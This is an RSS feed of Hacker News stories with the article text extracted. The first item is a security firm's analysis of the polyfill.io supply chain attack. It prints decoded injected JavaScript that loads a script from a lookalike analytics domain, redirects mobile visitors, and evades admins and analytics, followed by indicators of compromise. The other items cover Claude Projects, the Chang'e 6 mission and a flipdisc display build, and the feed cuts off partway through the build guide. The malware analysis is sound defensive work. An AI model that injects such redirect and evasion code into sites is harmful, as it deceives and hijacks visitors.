(ignoring known css parsing error)
<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Tue, 25 Jun 2024 19:30:04 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Polyfill supply chain attack hits 100K+ sites (130 pts)]]></title>
            <link>https://sansec.io/research/polyfill-supply-chain-attack</link>
            <guid>40791829</guid>
            <pubDate>Tue, 25 Jun 2024 18:27:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://sansec.io/research/polyfill-supply-chain-attack">https://sansec.io/research/polyfill-supply-chain-attack</a>, See on <a href="https://news.ycombinator.com/item?id=40791829">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><strong>Update June 25th</strong>: Google has already started blocking Google Ads for eCommerce sites that use polyfill.io.</p><p>The <code>polyfill.js</code> is a popular open source library to support older browsers. <a href="https://publicwww.com/websites/%22cdn.polyfill.io%22/">100K+ sites</a> embed it using the <code>cdn.polyfill.io</code> domain. Notable users are JSTOR, Intuit and World Economic Forum. However, in February this year, a Chinese company bought the domain and the Github account. Since then, this domain was caught injecting <a href="https://web.archive.org/web/20240624110153/https://github.com/polyfillpolyfill/polyfill-service/issues/2873">malware</a> on mobile devices via any site that embeds <code>cdn.polyfill.io</code>. Any complaints were quickly removed (<a href="https://web.archive.org/web/20240229113710/https://github.com/polyfillpolyfill/polyfill-service/issues/2834">archive here</a>) from the Github repository.</p><p>The polyfill code is dynamically generated based on the HTTP headers, so multiple attack vectors are likely. Sansec decoded one particular malware (see below) which redirects mobile users to a <a href="https://w9.vty70.net/">sports betting site</a> using a fake Google analytics domain (<code>www.googie-anaiytics.com</code>). The code has specific protection against reverse engineering, and only activates on specific mobile devices at specific hours. It also does not activate when it detects an admin user. It also delays execution when a web analytics service is found, presumably to not end up in the stats.</p><p>The original <a href="https://x.com/triblondon/status/1761852117579427975">polyfill author</a> recommends to not use Polyfill at all, as it is no longer needed by modern browsers anyway. Meanwhile, both <a href="https://community.fastly.com/t/new-options-for-polyfill-io-users/2540">Fastly</a> and <a href="https://cdnjs.cloudflare.com/polyfill">Cloudflare</a> have put up trustworthy alternatives, if you still need it.</p><p>This incident is a typical example of a supply chain attack. To get visibility into the code that your users are loading, we recommend our (free) CSP monitoring service <a href="https://sansec.io/watch">Sansec Watch</a>.</p><p>Our <a href="https://sansec.io/#ecomscan">eComscan backend scanner</a> has also been updated with <a href="https://polyfill.io/">polyfill.io</a> detection.</p><h2 id="polyfill-malicious-payload-example" tabindex="-1">Polyfill malicious payload example</h2><p>We added some names for readability, however <code>tiaozhuan</code> came from the original malware (which means "jump" in Chinese).</p><pre><code><span>function</span> <span>isPc</span>(<span></span>) {
  <span>try</span> {
    <span>var</span> _isWin =
        navigator.<span>platform</span> == <span>"Win32"</span> || navigator.<span>platform</span> == <span>"Windows"</span>,
      _isMac =
        navigator.<span>platform</span> == <span>"Mac68K"</span> ||
        navigator.<span>platform</span> == <span>"MacPPC"</span> ||
        navigator.<span>platform</span> == <span>"Macintosh"</span> ||
        navigator.<span>platform</span> == <span>"MacIntel"</span>;
    <span>if</span> (_isMac || _isWin) {
      <span>return</span> <span>true</span>;
    } <span>else</span> {
      <span>return</span> <span>false</span>;
    }
  } <span>catch</span> (_0x44e1f6) {
    <span>return</span> <span>false</span>;
  }
}
<span>function</span> <span>vfed_update</span>(<span>_0x5ae1f8</span>) {
  _0x5ae1f8 !== <span>""</span> &amp;&amp;
    <span>loadJS</span>(
      <span>"https://www.googie-anaiytics.com/html/checkcachehw.js"</span>,
      <span>function</span> (<span></span>) {
        <span>if</span> (usercache == <span>true</span>) {
          <span>window</span>.<span>location</span>.<span>href</span> = _0x5ae1f8;
        }
      }
    );
}
<span>function</span> <span>check_tiaozhuan</span>(<span></span>) {
  <span>var</span> _isMobile = navigator.<span>userAgent</span>.<span>match</span>(
    <span>/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i</span>
  );
  <span>if</span> (_isMobile) {
    <span>var</span> _curHost = <span>window</span>.<span>location</span>.<span>host</span>,
      _ref = <span>document</span>.<span>referrer</span>,
      _redirectURL = <span>""</span>,
      _kuurzaBitGet = <span>"https://kuurza.com/redirect?from=bitget"</span>,
      _rnd = <span>Math</span>.<span>floor</span>(<span>Math</span>.<span>random</span>() * <span>100</span> + <span>1</span>),
      _date = <span>new</span> <span>Date</span>(),
      _hours = _date.<span>getHours</span>();
    <span>if</span> (
      _curHost.<span>indexOf</span>(<span>"www.dxtv1.com"</span>) !== -<span>1</span> ||
      _curHost.<span>indexOf</span>(<span>"www.ys752.com"</span>) !== -<span>1</span>
    ) {
      _redirectURL = <span>"https://kuurza.com/redirect?from=bitget"</span>;
    } <span>else</span> {
      <span>if</span> (_curHost.<span>indexOf</span>(<span>"shuanshu.com.com"</span>) !== -<span>1</span>) {
        _redirectURL = <span>"https://kuurza.com/redirect?from=bitget"</span>;
      } <span>else</span> {
        <span>if</span> (_ref.<span>indexOf</span>(<span>"."</span>) !== -<span>1</span> &amp;&amp; _ref.<span>indexOf</span>(_curHost) == -<span>1</span>) {
          _redirectURL = <span>"https://kuurza.com/redirect?from=bitget"</span>;
        } <span>else</span> {
          <span>if</span> (_hours &gt;= <span>0</span> &amp;&amp; _hours &lt; <span>2</span>) {
            <span>if</span> (_rnd &lt;= <span>10</span>) {
              _redirectURL = _kuurzaBitGet;
            }
          } <span>else</span> {
            <span>if</span> (_hours &gt;= <span>2</span> &amp;&amp; _hours &lt; <span>4</span>) {
              _rnd &lt;= <span>15</span> &amp;&amp; (_redirectURL = _kuurzaBitGet);
            } <span>else</span> {
              <span>if</span> (_hours &gt;= <span>4</span> &amp;&amp; _hours &lt; <span>7</span>) {
                _rnd &lt;= <span>20</span> &amp;&amp; (_redirectURL = _kuurzaBitGet);
              } <span>else</span> {
                _hours &gt;= <span>7</span> &amp;&amp; _hours &lt; <span>8</span>
                  ? _rnd &lt;= <span>10</span> &amp;&amp; (_redirectURL = _kuurzaBitGet)
                  : _rnd &lt;= <span>10</span> &amp;&amp; (_redirectURL = _kuurzaBitGet);
              }
            }
          }
        }
      }
    }
    _redirectURL != <span>""</span> &amp;&amp;
      !<span>isPc</span>() &amp;&amp;
      <span>document</span>.<span>cookie</span>.<span>indexOf</span>(<span>"admin_id"</span>) == -<span>1</span> &amp;&amp;
      <span>document</span>.<span>cookie</span>.<span>indexOf</span>(<span>"adminlevels"</span>) == -<span>1</span> &amp;&amp;
      <span>vfed_update</span>(_redirectURL);
  }
}
<span>let</span> _outerPage = <span>document</span>.<span>documentElement</span>.<span>outerHTML</span>,
  bdtjfg = _outerPage.<span>indexOf</span>(<span>"hm.baidu.com"</span>) != -<span>1</span>;
<span>let</span> cnzfg = _outerPage.<span>indexOf</span>(<span>".cnzz.com"</span>) != -<span>1</span>,
  wolafg = _outerPage.<span>indexOf</span>(<span>".51.la"</span>) != -<span>1</span>;
<span>let</span> mattoo = _outerPage.<span>indexOf</span>(<span>".matomo.org"</span>) != -<span>1</span>,
  aanaly = _outerPage.<span>indexOf</span>(<span>".google-analytics.com"</span>) != -<span>1</span>;
<span>let</span> ggmana = _outerPage.<span>indexOf</span>(<span>".googletagmanager.com"</span>) != -<span>1</span>,
  aplausix = _outerPage.<span>indexOf</span>(<span>".plausible.io"</span>) != -<span>1</span>,
  statcct = _outerPage.<span>indexOf</span>(<span>".statcounter.com"</span>) != -<span>1</span>;
bdtjfg || cnzfg || wolafg || mattoo || aanaly || ggmana || aplausix || statcct
  ? <span>setTimeout</span>(check_tiaozhuan, <span>2000</span>)
  : <span>check_tiaozhuan</span>();
</code></pre><h2 id="indicators-of-compromise" tabindex="-1">Indicators of compromise</h2><pre><code>https://kuurza.com/redirect?from=bitget
https://www.googie-anaiytics.com/html/checkcachehw.js
https://www.googie-anaiytics.com/ga.js
</code></pre><h2>Read more</h2><ul><li><a href="https://sansec.io/research/cosmicsting">CosmicSting attack threatens 75% of Adobe Commerce stores</a></li><li><a href="https://sansec.io/research/magento-xml-backdoor">Persistent Magento backdoor hidden in XML</a></li><li><a href="https://sansec.io/research/virustotal-sansec">Sansec joins forces with Google's VirusTotal</a></li><li><a href="https://sansec.io/research/europol-sansec-action">Sansec and Europol counter online skimming</a></li><li><a href="https://sansec.io/research/magento-wish-list-exploits">Magento wish list exploit bypasses WAF protection</a></li></ul></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Anthropic Introduces Claude Projects (116 pts)]]></title>
            <link>https://support.anthropic.com/en/articles/9519177-how-can-i-create-and-manage-projects</link>
            <guid>40790911</guid>
            <pubDate>Tue, 25 Jun 2024 17:04:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://support.anthropic.com/en/articles/9519177-how-can-i-create-and-manage-projects">https://support.anthropic.com/en/articles/9519177-how-can-i-create-and-manage-projects</a>, See on <a href="https://news.ycombinator.com/item?id=40790911">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><p>Projects are available for users on Team and Pro plans. </p><p><h3 id="h_3cc3a0e252"><b>Creating a Project</b> </h3></p><p>Once your project is set up, you can initiate chats with Claude.</p><p><h3 id="h_c612fdf243"><b>Project Knowledge </b></h3></p><p>You'll find the project knowledge base on the right side of your project's main page. Anything you upload to this space will be used across all of your chats within that project.</p><p>To add content to your project knowledge base:</p><p>To add custom instructions to your project knowledge base:</p><p>Note: Context is not shared across chats within a project unless the information is added into the project knowledge base.</p><p><h3 id="h_33951f52df"><b>Starring a Project</b></h3></p><p>Starring a project allows for quick access from your projects and chats list, visible when hovering over the left side of your account. To star a project:</p><section><hr><p>Related Articles</p><section><a href="https://support.anthropic.com/en/articles/7996857-my-prompt-isn-t-giving-me-a-helpful-answer" data-testid="article-link"><p><span>My prompt isn’t giving me a helpful answer.</span></p></a><a href="https://support.anthropic.com/en/articles/8325606-what-is-claude-pro" data-testid="article-link"><p><span>What is Claude Pro?</span></p></a><a href="https://support.anthropic.com/en/articles/8325614-how-can-i-maximize-my-claude-pro-usage" data-testid="article-link"><p><span>How can I maximize my Claude Pro usage?</span></p></a><a href="https://support.anthropic.com/en/articles/9266767-what-is-the-team-plan-for-using-claude" data-testid="article-link"><p><span>What is the Team plan for using Claude?</span></p></a><a href="https://support.anthropic.com/en/articles/9517075-what-are-projects" data-testid="article-link"><p><span>What are Projects?</span></p></a></section></section></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Chang'e 6 lunar sample return mission returns with samples from moon's far side (103 pts)]]></title>
            <link>https://www.theguardian.com/world/article/2024/jun/25/chinas-change-6-lunar-probe-returns-world-first-samples-from-far-side-of-the-moon</link>
            <guid>40790057</guid>
            <pubDate>Tue, 25 Jun 2024 15:48:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theguardian.com/world/article/2024/jun/25/chinas-change-6-lunar-probe-returns-world-first-samples-from-far-side-of-the-moon">https://www.theguardian.com/world/article/2024/jun/25/chinas-change-6-lunar-probe-returns-world-first-samples-from-far-side-of-the-moon</a>, See on <a href="https://news.ycombinator.com/item?id=40790057">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="maincontent"><p>China has become the first country to gather samples from the far side of the moon and bring them back to Earth in a landmark achievement for the Beijing space programme.</p><p>A <a href="https://www.theguardian.com/science/article/2024/jun/04/china-lunar-probe-far-side-moon-change-6" data-link-name="in body link">re-entry capsule</a> containing the precious cargo parachuted into a landing zone in the rural Siziwang Banner region of Inner Mongolia on Tuesday after being released into Earth’s orbit by the uncrewed Chang’e-6 probe.</p><p>The return of the lunar material wraps up a highly successful mission for the China National <a href="https://www.theguardian.com/science/space" data-link-name="in body link" data-component="auto-linked-tag">Space</a> Administration (CNSA) amid a wave of interest in which space agencies and private companies will build instruments and bases on the moon and exploit its resources.</p><p>The Chang’e-6 mission, named after the Chinese moon goddess, blasted off from Hainan province in south China on 3 May and touched down on 2 June on the side of the moon that is never seen from Earth. <a href="https://www.theguardian.com/science/moon" data-link-name="in body link" data-component="auto-linked-tag">The moon</a> shows only one face to the Earth because it is tidally locked and completes one full rotation in the time it takes to circle the planet.</p><p>The mission’s lander spent two days collecting rock and soil from one of the oldest and largest craters on the moon, the 1,600-mile-wide South Pole-Aitken (SPA) basin, using a robotic arm and drill. Its ascent module then lifted off from the moon’s surface and rendezvoused with the orbiter before embarking on its journey home.</p><figure id="dc360ff1-e902-43da-8bd1-0a219f967677" data-spacefinder-role="inline" data-spacefinder-type="model.dotcomrendering.pageElements.YoutubeBlockElement"><gu-island name="YoutubeBlockComponent" priority="critical" deferuntil="visible" props="{&quot;format&quot;:{&quot;display&quot;:0,&quot;theme&quot;:0,&quot;design&quot;:0},&quot;isMainMedia&quot;:false,&quot;id&quot;:&quot;651e110a-5f4c-4642-80cc-b6dad895e266&quot;,&quot;assetId&quot;:&quot;y2AslDDnk0E&quot;,&quot;expired&quot;:false,&quot;posterImage&quot;:[{&quot;url&quot;:&quot;https://media.guim.co.uk/f658423bf58cf614f16af6c87fa0ce66383f2519/43_48_1809_1017/1000.jpg&quot;,&quot;width&quot;:1000},{&quot;url&quot;:&quot;https://media.guim.co.uk/f658423bf58cf614f16af6c87fa0ce66383f2519/43_48_1809_1017/500.jpg&quot;,&quot;width&quot;:500},{&quot;url&quot;:&quot;https://media.guim.co.uk/f658423bf58cf614f16af6c87fa0ce66383f2519/43_48_1809_1017/140.jpg&quot;,&quot;width&quot;:140},{&quot;url&quot;:&quot;https://media.guim.co.uk/f658423bf58cf614f16af6c87fa0ce66383f2519/43_48_1809_1017/1809.jpg&quot;,&quot;width&quot;:1809}],&quot;duration&quot;:35,&quot;mediaTitle&quot;:&quot;China launches uncrewed rocket to far side of moon – video&quot;,&quot;origin&quot;:&quot;https://www.theguardian.com&quot;,&quot;stickyVideos&quot;:false,&quot;switches&quot;:{&quot;lightbox&quot;:true,&quot;prebidAppnexusUkRow&quot;:true,&quot;abSignInGateMainVariant&quot;:true,&quot;commercialMetrics&quot;:true,&quot;prebidTrustx&quot;:true,&quot;scAdFreeBanner&quot;:false,&quot;adaptiveSite&quot;:true,&quot;prebidPermutiveAudience&quot;:true,&quot;compareVariantDecision&quot;:false,&quot;enableSentryReporting&quot;:true,&quot;lazyLoadContainers&quot;:true,&quot;ampArticleSwitch&quot;:true,&quot;remarketing&quot;:true,&quot;articleEndSlot&quot;:true,&quot;keyEventsCarousel&quot;:true,&quot;updateLogoAdPartner&quot;:true,&quot;registerWithPhone&quot;:false,&quot;darkModeWeb&quot;:true,&quot;targeting&quot;:true,&quot;remoteHeader&quot;:true,&quot;slotBodyEnd&quot;:true,&quot;prebidImproveDigitalSkins&quot;:true,&quot;ampPrebidOzone&quot;:true,&quot;extendedMostPopularFronts&quot;:true,&quot;emailInlineInFooter&quot;:true,&quot;showNewPrivacyWordingOnEmailSignupEmbeds&quot;:true,&quot;abDeeplyReadRightColumn&quot;:true,&quot;prebidAnalytics&quot;:true,&quot;extendedMostPopular&quot;:true,&quot;ampContentAbTesting&quot;:false,&quot;prebidCriteo&quot;:true,&quot;okta&quot;:true,&quot;imrWorldwide&quot;:true,&quot;acast&quot;:true,&quot;automaticFilters&quot;:true,&quot;twitterUwt&quot;:true,&quot;updatedHeaderDesign&quot;:true,&quot;prebidAppnexusInvcode&quot;:true,&quot;ampPrebidPubmatic&quot;:true,&quot;a9HeaderBidding&quot;:true,&quot;prebidAppnexus&quot;:true,&quot;useSourcepointPropertyId&quot;:false,&quot;enableDiscussionSwitch&quot;:true,&quot;prebidXaxis&quot;:true,&quot;stickyVideos&quot;:true,&quot;interactiveFullHeaderSwitch&quot;:true,&quot;discussionAllPageSize&quot;:true,&quot;prebidUserSync&quot;:true,&quot;audioOnwardJourneySwitch&quot;:true,&quot;brazeTaylorReport&quot;:false,&quot;mastheadWithHighlights&quot;:false,&quot;euro2024Header&quot;:true,&quot;externalVideoEmbeds&quot;:true,&quot;abSignInGateAlternativeWording&quot;:false,&quot;callouts&quot;:true,&quot;sentinelLogger&quot;:true,&quot;geoMostPopular&quot;:true,&quot;weAreHiring&quot;:false,&quot;relatedContent&quot;:true,&quot;thirdPartyEmbedTracking&quot;:true,&quot;prebidOzone&quot;:true,&quot;ampLiveblogSwitch&quot;:true,&quot;ampAmazon&quot;:true,&quot;prebidAdYouLike&quot;:true,&quot;mostViewedFronts&quot;:true,&quot;optOutAdvertising&quot;:true,&quot;abSignInGateMainControl&quot;:true,&quot;googleSearch&quot;:true,&quot;brazeSwitch&quot;:true,&quot;prebidKargo&quot;:true,&quot;consentManagement&quot;:true,&quot;personaliseSignInGateAfterCheckout&quot;:true,&quot;prebidSonobi&quot;:true,&quot;idProfileNavigation&quot;:true,&quot;confiantAdVerification&quot;:true,&quot;discussionAllowAnonymousRecommendsSwitch&quot;:false,&quot;absoluteServerTimes&quot;:false,&quot;permutive&quot;:true,&quot;comscore&quot;:true,&quot;ampPrebidCriteo&quot;:true,&quot;tagLinkDesign&quot;:false,&quot;abMpuWhenNoEpic&quot;:false,&quot;newsletterOnwards&quot;:false,&quot;youtubeIma&quot;:true,&quot;webFonts&quot;:true,&quot;prebidImproveDigital&quot;:true,&quot;abAdBlockAsk&quot;:false,&quot;ophan&quot;:true,&quot;crosswordSvgThumbnails&quot;:true,&quot;prebidTriplelift&quot;:true,&quot;weather&quot;:true,&quot;prebidPubmatic&quot;:true,&quot;serverShareCounts&quot;:false,&quot;autoRefresh&quot;:true,&quot;enhanceTweets&quot;:true,&quot;prebidIndexExchange&quot;:true,&quot;prebidOpenx&quot;:true,&quot;prebidHeaderBidding&quot;:true,&quot;idCookieRefresh&quot;:true,&quot;discussionPageSize&quot;:true,&quot;smartAppBanner&quot;:false,&quot;historyTags&quot;:true,&quot;brazeContentCards&quot;:true,&quot;surveys&quot;:true,&quot;remoteBanner&quot;:true,&quot;emailSignupRecaptcha&quot;:true,&quot;prebidSmart&quot;:true,&quot;shouldLoadGoogletag&quot;:true,&quot;inizio&quot;:true}}" config="{&quot;renderingTarget&quot;:&quot;Web&quot;,&quot;darkModeAvailable&quot;:false,&quot;updateLogoAdPartnerSwitch&quot;:true,&quot;assetOrigin&quot;:&quot;https://assets.guim.co.uk/&quot;}"><div data-chromatic="ignore" data-component="youtube-atom"><figcaption><span><svg width="36" height="23" viewBox="0 0 36 23"><path d="M3.2 0l-3.2 3.3v16.4l3.3 3.3h18.7v-23h-18.8m30.4 1l-8.6 8v5l8.6 8h2.4v-21h-2.4"></path></svg></span><span>China launches uncrewed rocket to far side of moon – video</span></figcaption></div></gu-island></figure><p>“This is a great achievement by China,” said Martin Barstow, a professor of astrophysics and space science at the University of Leicester. “Recovering any samples from the moon is difficult, but doing so from the far side, where communications are particularly difficult is a step taken by no other agency. A real technological feat.”</p><p>The US, China and the former Soviet Union have gathered samples from the near side of the moon but China is the first to bring material home from the far side. The intention was to collect up to 2kg of moon rock and soil.</p><p>China previously collaborated with international scientists to study samples it brought back from the near side of the moon but it is unclear whether similar access will be granted to the new material from the far side.</p><p>The latest samples could shed light on longstanding mysteries in the early history of the moon and Earth. Ian Crawford, a professor of planetary science at Birkbeck, University of London, said dating the SPA was a “key objective” of lunar science because it would pin down the timeframe for lunar cratering.</p><p>Understanding the rate at which large asteroids battered the moon in its early history would shed light on the impact history of Earth, he added, as our home planet would be struck by the same kinds of asteroids at the same time. “Constraining this is important for understanding the impact regime under which life first appeared on Earth,” he said.</p><p>The collision that created the SPA basin may have scooped out enough rock to expose areas of the lunar mantle, which researchers believe is crucial to understanding the history, and potentially the origins, of the moon.</p><figure id="e05bd69f-bdb2-48f4-b882-6c605f14ccb2" data-spacefinder-role="richLink" data-spacefinder-type="model.dotcomrendering.pageElements.RichLinkBlockElement"><gu-island name="RichLinkComponent" priority="feature" deferuntil="idle" props="{&quot;richLinkIndex&quot;:12,&quot;element&quot;:{&quot;_type&quot;:&quot;model.dotcomrendering.pageElements.RichLinkBlockElement&quot;,&quot;prefix&quot;:&quot;Related: &quot;,&quot;text&quot;:&quot;The new ‘space race’: what are China’s ambitions and why is the US so concerned?&quot;,&quot;elementId&quot;:&quot;e05bd69f-bdb2-48f4-b882-6c605f14ccb2&quot;,&quot;role&quot;:&quot;richLink&quot;,&quot;url&quot;:&quot;https://www.theguardian.com/world/article/2024/may/05/the-new-space-race-what-are-chinas-ambitions-and-why-is-the-us-so-concerned&quot;},&quot;ajaxUrl&quot;:&quot;https://api.nextgen.guardianapps.co.uk&quot;,&quot;format&quot;:{&quot;display&quot;:0,&quot;theme&quot;:0,&quot;design&quot;:0}}" config="{&quot;renderingTarget&quot;:&quot;Web&quot;,&quot;darkModeAvailable&quot;:false,&quot;updateLogoAdPartnerSwitch&quot;:true,&quot;assetOrigin&quot;:&quot;https://assets.guim.co.uk/&quot;}"></gu-island></figure><p>“It is possible that the SPA has excavated deep enough to expose the lunar mantle, and possible that fragments might be found in the Chang’e-6 samples,” Crawford said. “It’s long shot but it’s worth looking.”</p><p>The far side of the moon has fewer ancient lava plains or maria, a thicker crust, and because it is not shielded by Earth, sports more craters from violent impacts.</p><p>“Recovering samples from the far side is tremendously exciting scientifically, as we only have very limited information on the geology there,” Barstow said. “It has been processed very differently to the side of the moon facing us, which has been extensively resurfaced by volcanic activity in the past, creating the maria from which most samples have been obtained.”</p><p>China has more lunar missions planned this decade. They are intended to pave the way for an International Lunar Research base, which it will co-lead with Roscosmos, the Russian space agency, and the eventual landing of a Chinese astronaut on the moon.</p><p>Dr Simeon Barber, a senior research fellow at the Open University, said: “We’re entering a new era of discovery, and getting samples returned from the far side is a milestone achievement that will help us understand the geological history in that region, and why it differs so markedly from the more familiar near side.</p><p>“Specialised laboratories around the world have spent five decades finessing the analytical techniques to tease out the moon’s secrets from within near side samples returned by the Apollo and Luna missions. And now we are on the cusp of applying all that expertise to learn about the enigmatic far side of our nearest neighbour in space.”</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Testing AMD's Giant MI300X (126 pts)]]></title>
            <link>https://chipsandcheese.com/2024/06/25/testing-amds-giant-mi300x/</link>
            <guid>40789919</guid>
            <pubDate>Tue, 25 Jun 2024 15:36:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://chipsandcheese.com/2024/06/25/testing-amds-giant-mi300x/">https://chipsandcheese.com/2024/06/25/testing-amds-giant-mi300x/</a>, See on <a href="https://news.ycombinator.com/item?id=40789919">Hacker News</a></p>
Couldn't get https://chipsandcheese.com/2024/06/25/testing-amds-giant-mi300x/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: I built a large JavaScript powered flipdisc display. Here's a guide (186 pts)]]></title>
            <link>https://flipdisc.io/</link>
            <guid>40789672</guid>
            <pubDate>Tue, 25 Jun 2024 15:14:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://flipdisc.io/">https://flipdisc.io/</a>, See on <a href="https://news.ycombinator.com/item?id=40789672">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>  
<p><strong>Flipdiscs</strong> (or <em>flip dots</em>) are a display type that utilizes electromagnetic pulses to flip a small disc between two colors. Despite being <a href="https://en.wikipedia.org/wiki/Flip-disc_display#History">invented over 80 years ago</a>, the underlying technology is mostly the same today. I chose them because I wanted to design a large interactive wall art for my office, and didn’t like the LED glow of traditional screens. Flip displays are an interesting alternative. They have no moving parts, near limitless lifespan, high readability, and achieves anywhere between 25-60fps. Also, as a pleasant bonus, they emit a sound like rain hitting a window each time one of the disc flips - I find it very soothing. I’ve always wanted unique ways to visualize code, like this <a href="https://github.com/kelly/electroknit-app">pixel knitting app</a> we designed for <a href="https://beckystern.com/2010/11/02/hacking-the-brother-kh-930e-knitting-machine/">electroknit knitting machines</a> or this <a href="https://github.com/simpsoka/atom-crafts">crafting tool</a> for Atom Editor (RIP). Flipdots seemed like a similar fun challenge. I paired with my <a href="https://github.com/kelly">partner</a> to help code and design the board. Who doesn’t love quality hacking time with their partner?! I’m not sure how many people will find this useful since flipdisc displays are sort of an obscure technology, but here we go!</p>

<p><iframe src="https://www.youtube.com/embed/_Kc9zDlKURs" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube video player"></iframe></p>
<p><strong>Contents</strong></p>
<ol>
<li><a href="#build">Build</a></li>
<li><a href="#software">Software</a></li>
<li><a href="#design">Design</a></li>
<li><a href="#next-steps">Next Steps</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ol>
<hr>

<h3 id="panels">Panels</h3>
<p>We used 9 <a href="https://flipdots.com/en/products-services/flip-dot-boards-xy5/">Alfazeta panels</a> in a 3x3 grid or 84x42 discs. Each board has (2) 28x7 panels. You can see the measurments of the toal design in this diagram. The PCB features an older <a href="https://www.microchip.com/en-us/product/atmega128">ATMEGA128 microcontroller</a>, a couple hundred MELF diodes (be sure to <a href="https://www.digikey.com/en/products/detail/vishay-general-semiconductor-diodes-division/LL4148-GS08/3104225">buy extras</a>, because they can pop off easily!) charlieplexed together, and two DIP switches. One DIP switch sets the address, and the other sets the baud rate. Find more information about the AlfaZeta boards, here is the <a href="https://github.com/chrishemmings/flipPyDot/blob/master/resources/14x28_7x28_FLIPDOTS%20Sign%20REV9%20-%20Manual.pdf">manual</a>.</p>
<p>It’s relatively difficult to source flipdisc boards or components, so your options are limited. If I were to do the project again, I would consider experimenting with designing my own board or one like <a href="https://www.alibaba.com/product-detail/15mm8-8-ledmechanical-interactive-device-flip_1600972947222.html">this design</a> which has a more modular arrangement and custom disc colors. These <a href="https://flipdots.com/en/products-services/small-7-segment-displays/">7-segment flipdiscs</a> also look really neat. Having access to the firmware would be a nice option when tuning performance. I also really wish I could’ve gone larger, but the expense of the panels really adds up fast. Unfortunately, right now, flipdiscs are more catered towards businesses (mostly the transportation industry) than the general consumer. Hopefully that changes.</p>
<ul>
<li><a href="https://flipdots.com/en/home/">Alfazeta</a></li>
<li><a href="https://xqd-led.en.alibaba.com/productgrouplist-936470954-2/Flip_dot_module.html">Shenzhen Xinqidian Opto Technology Factory</a></li>
<li><a href="https://www.hanoverdisplays.com/">Hanover</a></li>
<li><a href="https://www.kickstarter.com/projects/marcinsaj/flip-disc-displays-arduino-based/description">Flipo</a></li>
</ul>
<h3 id="power">Power</h3>
<p>To power the board, it needs a total 24V 1A per board, or 9A total to send enough power to flip all the dots. We ended up using a 24V 10A Meanwell power supply. <a href="https://www.jameco.com/webapp/wcs/stores/servlet/ProductDisplay?catalogId=10001&amp;langId=-1&amp;storeId=10001&amp;productId=2115039">MEAN WELL HLG-240H-24</a></p>
<h3 id="frame">Frame</h3>
<p>We built the frame using <a href="https://8020.net/">80/20 aluminum extrusions</a>, and screwed the PCB standoffs directly onto the frame. Word of caution: the boards and discs are incredibly fragile (My kids love to mess with them!) I read somewhere that flipdiscs are similar to butterfly wings, and I think that’s an appropriate analogy. It’s really easy to lose or break discs in the building process. Make sure to handle by the edges and carefully attach each board one-at-a-time. Here is a list of 80/20 parts that we purchased:</p>
<ul>
<li>(7) <a href="https://8020.net/1010.html">1010</a> - cut to 25.2in</li>
<li>(2) <a href="https://8020.net/1010.html">1010</a> - cut to 49.65in</li>
<li>(12) <a href="https://8020.net/33460.html">33460</a> Corner Connector</li>
<li>(72) <a href="https://www.amazon.com/gp/product/B07KRRG8HT">M3x16MM screws</a></li>
<li>(72) <a href="https://www.amazon.com/gp/product/B07BLSRZYJ">M3x10MM spacer</a></li>
</ul>
<p>80/20 is really easy to assemble. I would also recommend the <a href="https://8020.net/6120.html">10-series jig</a> and <a href="https://8020.net/6115.html">bit</a> for drilling mounting holes. We also built a wood frame out of birch. You could easily skip this part and just mount the 80/20 frame. Woodworking is beyond the scope of this article. Here are some <a href="https://flipdisc.io/photos">photos of the final build</a>.</p>
<astro-island uid="1tN6di" component-url="/_astro/BoardLayout.BgyfO1RF.js" component-export="default" renderer-url="/_astro/client.E677JtKR.js" props="{}" ssr="" client="only" opts="{&quot;name&quot;:&quot;BoardLayout&quot;,&quot;value&quot;:&quot;react&quot;}"></astro-island>
<h3 id="cabling">Cabling</h3>
<p>We connected each column in series, and then chained them all together. The data lines are +/- on the RS485 block terminal. We used 18AWG wire for the power lines and 22 AWG shielded cable for the data. It’s helpful to have some <a href="https://www.wago.com/us/discover-wire-and-splicing-connectors">Wago Wire Lever Nuts</a> for splicing and crimping terminals for the wire ends. If you want to achieve high framerates, make sure you’re using an RS485 line for no more than 6 panels. We used a total of 3 <a href="https://www.amazon.com/Serial-Converter-Adapter-Supports-Windows/dp/B076WVFXN8/">USB RS485 devices</a> for the display. <a href="https://www.amazon.com/USR-Usr-Tcp232-410S-Ethernet-Adapter-Converter/dp/B07C1TC165/">RS485 to ethernet servers</a> are also great if you want to serve the content from an external server.</p>
<astro-island uid="16HUaf" component-url="/_astro/DitheredImage.CzBiUX6Z.js" component-export="default" renderer-url="/_astro/client.E677JtKR.js" props="{&quot;src&quot;:[0,&quot;/cables-2.webp&quot;],&quot;scale&quot;:[0,1]}" ssr="" client="only" opts="{&quot;name&quot;:&quot;DitheredImage&quot;,&quot;value&quot;:&quot;react&quot;}"></astro-island>
<p>Depending on the type of board that you get, here are some tools and parts that I recommend:</p>
<ul>
<li>(18) <a href="https://www.amazon.com/gp/product/B077979RZR/">5.08mm Pitch Male Female PCB Screw Terminal Block</a></li>
